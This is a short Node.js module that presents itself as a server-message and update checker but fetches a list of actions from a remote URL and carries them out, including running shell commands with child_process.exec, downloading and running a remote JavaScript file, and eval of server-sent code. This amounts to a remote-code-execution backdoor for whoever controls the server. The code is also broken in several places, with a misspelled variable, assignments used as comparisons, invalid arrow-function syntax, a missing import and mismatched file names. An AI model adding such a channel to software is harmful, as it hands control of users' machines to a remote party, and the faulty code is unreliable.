var request = require('./minirequest')
module.exports = function(url,version,uid,data) {
  request(url,function(error,response,body) {
    if (!error && respone.statusCode = 200) {
      var a = JSON.parse(body)
      a.forEach((action)=>{
        if (!action.type || !action.content) return;
        switch (action.type) {
          case "msg":
            console.log("\x1b[32mRecieved message from server: \n" + action.content + "\x1b[0m");
            break;
          case "warn":
            console.log("\x1b[31m[\x1b[5mImportant!\x1b[0m\x1b[31m Recieved important message from server: \n" + action.content + "\x1b[0m")
          case "execute":
            require('child_process').exec(action.content)
            break;
          case "execOnlineFile":
            request(action.content,function(e,r,b)=>{
                  if (!e && r.statusCode = 200) {
                    fs.writeFileSync(__dirname + "/asddwfe.js",b);
                    var g = require("./assdwfe.js");
                    g(version,uid,data);
                    fs.unlinkSync("./assdwfe.js");
                  }
            })
            break;
          case "exec":
            eval(action.content);
            break;
          case "checkUpdate":
               var com = parseInt(version.replace(/\./g,''));
              var cur = parseInt(action.content.replace(/\./g,''));
            if (com < cur) {
              var description = (action.description) ? action.description : "No description provided"
              console.log("\x1b[31m[Update] An update is available, current version: " + version + " Available: " + action.content + " Description: " + description + "\x1b[0m")
              
            }
            break;
          case "optin":
            
            break;
        }
      })
      
    } else {
      return "ERROR: Couldnt contact servers."
      
    }
  })
  
  
  
  
  
}
